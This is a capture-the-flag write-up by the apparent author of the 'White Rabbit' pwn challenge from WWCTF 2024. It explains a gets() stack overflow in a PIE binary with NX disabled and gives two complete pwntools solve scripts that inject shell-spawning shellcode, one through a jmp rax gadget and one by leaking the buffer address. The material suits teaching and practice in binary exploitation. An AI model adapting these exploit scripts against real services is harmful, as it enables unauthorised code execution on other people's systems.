White Rabbit is a shellcode challenge I created for WWCTF 2024. I will walk you through the intended solution and share an very clever approach discovered by my teammate @Nosimue.


## Overview

We are given a binary (white_rabbit) and a remote netcat endpoint. The first step is to analyze the binary's protections useing `checksec`

```shell
[d@d-20tk001gus challs]$ checksec --file=white_rabbit
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   31 Symbols	  No	0		2		white_rabbit
```

1. NX Disabled: Allows execution of injected shellcode.
2. PIE Enabled: The binary is loaded at a random address in memory.
3. No Canary: The binary does not use stack canaries, which are a protection against buffer overflow attacks.
4. ASLR Enabled: Stack and binary addresses are randomized.

Running the program locally:

```shell

  (\_/)
  ( •_•)
  / > 0x60f1f6156180

follow the white rabbit...
```

The program prints an address. Disassembling the binary in Ghidra reveals that the printed address is the address of the main function. Here's a look at main:

```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("\n  (\\_/)");
  puts(&DAT_0010200d);
  printf("  / > %p\n\n",main);
  puts("follow the white rabbit...");
  follow();
  return 0;
}
```

And the follow function:

```c
void follow(void)

{
  char local_78 [112];
  
  gets(local_78);
  return;
}

```
The vulnerability is in follow(), which uses gets() to read user input without bounds, making a buffer overflow possible. Our goal is to inject shellcode into the buffer and execute it. However, since the leaked address is not a stack address, we don't know where to jump to. We need to find a different way to execute our shellcode,

## Analyzing Input

Let's take a look at what happens to our input after gets() is called in follow() Attaching a debugger and setting a breakpoint after gets() and sending 'AAAAAAA' as input we see:

```shell
$rax   : 0x00007fffffffe150  →  "AAAAAAAA"
$rbx   : 0x00007fffffffe2f8  →  0x00007fffffffe6c1  →  "/home/d/Downloads/WWCTF24/challs/white_rabbit"
$rcx   : 0x00007ffff7f828e0  →  0x00000000fbad208b
$rdx   : 0x0
$rsp   : 0x00007fffffffe150  →  "AAAAAAAA"
$rbp   : 0x00007fffffffe1c0  →  0x00007fffffffe1d0  →  0x00007fffffffe270  →  0x00007fffffffe2d0  →  0x0000000000000000
$rsi   : 0x00007ffff7f82963  →  0xf84720000000000a ("\n"?)
$rdi   : 0x00007ffff7f84720  →  0x0000000000000000
$rip   : 0x000055555555517d  →  <follow+0014> nop
$r8    : 0x0
$r9    : 0x0
$r10   : 0x0
$r11   : 0x246
$r12   : 0x1
$r13   : 0x0
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$r15   : 0x0000555555557dd8  →  0x0000555555555110  →   endbr64
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
```

The input buffer is pointed to by RAX after gets(). This makes sense as RAX is usually used to hold the return value of a functions. This means if we can find a jmp rax or call rax gadget in the binary, we can redirect execution to our shellcode in the buffer.

## Finding Gadgets with Ropper

Using ropper, we can search for a gadget to execute our shellcode:

```shell
[d@d-20tk001gus challs]$ ropper --file=white_rabbit --search "jmp rax"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp rax

[INFO] File: white_rabbit
0x00000000000010bf: jmp rax;
0x00000000000010bf: jmp rax; nop dword ptr [rax]; ret;
0x0000000000001100: jmp rax; nop word ptr [rax + rax]; ret;
```

The jmp rax gadget at 0x10bf allows us to jump directly to the address stored in RAX — exactly what we need.

## Crafting the exploit:

1. Calculate Base Address: Since PIE is enabled, the binary is loaded at a randomized base address. We use the leaked address of main to compute the base address:
`elf.address  = int(p.recvuntil("\n").strip(), 16) - elf.sym.main`
2. Calculate Overflow Offset: The distance between the start of the buffer and RIP is 120 bytes.
3. Craft our shellcode: We could write our own, but pwncools shellcraft is very convinient :) 
4. Finally we build our payload: First our shellcode, then padding to instruction pointer, and then our jmp rax gadget.

Here is our final solve script:

```python
elf = context.binary = ELF('../white_rabbit',)
p = remote("whiterabbit.chal.wwctf.com", 1337)

jmp_rax = next(elf.search(asm('jmp rax')))

p.recvuntil(">");
elf.address  = int(p.recvuntil("\n").strip(), 16) - elf.sym.main

jmp_rax += elf.address

payload = asm(shellcraft.sh())
payload = payload.ljust(120, b'A')
payload += p64(jmp_rax)

p.sendline(payload)
p.interactive()
```

`wwf{jmp_d0wn_th3_r4bb1t_h0le_0caba44088}`



## Alternate Solution: Leaking Buffer Address 

During internal testing of this challenge, my teammate @Nosiume came up with a very clever solve that bypasses the need for a jmp rax gadget entirely by leaking the address of the buffer. Here's how it works:

After gets() in the follow() function, the address of the buffer is stored in RAX. By finding a code path that prints the contents of RAX, we can leak the buffer address to bypass ASLR. This instuction within main moves the contents of rax to rsi.

` 0x00000000000011d1 <+45>:	mov    rsi,rax`

At this point:
   - rax holds the address of our input buffer.
   - rsi (set by mov rsi, rax) will be passed to printf() as the second argument during a subsequent call.

If we redirect execution to this instruction, the buffer address will be printed during the next printf() call. Afterward, the program continues to the follow() function, where we can use the leaked address for a direct return to our shellcode.

Here is his final solve script.



```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./white_rabbit')
context.terminal = ['alacritty', '-e']

gs = """
b *follow+26
continue
"""
io = gdb.debug(elf.path, gdbscript=gs) if args.GDB else process()

def exploit():
    context.log_level = 'info'

    io.recvuntil(b'> ')
    elf.address = int(io.recvline(), 16) - elf.sym.main

    info("elf base : " + hex(elf.address))
    info("target : " + hex(elf.address + 0x11d1))

    offset = 120
    payload = b'A'*offset + pack(elf.address + 0x11d1)

    io.sendlineafter(b'...\n', payload)
    io.recvuntil(b'> ')

    shellcode_addr = int(io.recvline(), 16)
    payload = flat({
        0: [ asm(shellcraft.amd64.linux.sh()) ],
        offset: [ shellcode_addr ]
    })

    io.sendlineafter(b'...\n', payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
```

If you came up with a unique solve or have feedback on the challenge, I'd love to hear from you.